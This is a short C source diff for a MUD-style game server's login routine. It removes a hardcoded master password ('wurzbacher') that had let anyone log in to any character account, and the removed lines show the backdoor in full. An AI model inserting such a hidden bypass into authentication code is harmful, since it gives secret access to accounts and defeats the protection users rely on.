@@ -1728,12 +1728,10 @@ void nanny(struct descriptor_data *d, char *arg)
 {
 	char buf[128];
 	int load_result;
-	char *hack;
 	char tmp_name[MAX_INPUT_LENGTH];
 	sh_int load_room = r_frozen_start_room;
 
 	skip_spaces(&arg);
-	hack = "wurzbacher";
 
 	switch (STATE(d))
 	{
@@ -1930,8 +1928,7 @@ void nanny(struct descriptor_data *d, char *arg)
 
 		else
 		{
-			if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character), MAX_PWD_LENGTH) &&
-			str_cmp(arg, hack))
+			if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character), MAX_PWD_LENGTH))
 			{
 				sprintf(buf, "Bad PW: %s [%s]", GET_NAME(d->character), !LOCAL_IP(d) ? d->host : "");
 				mudlog(buf, BRF, LVL_GOD, TRUE);
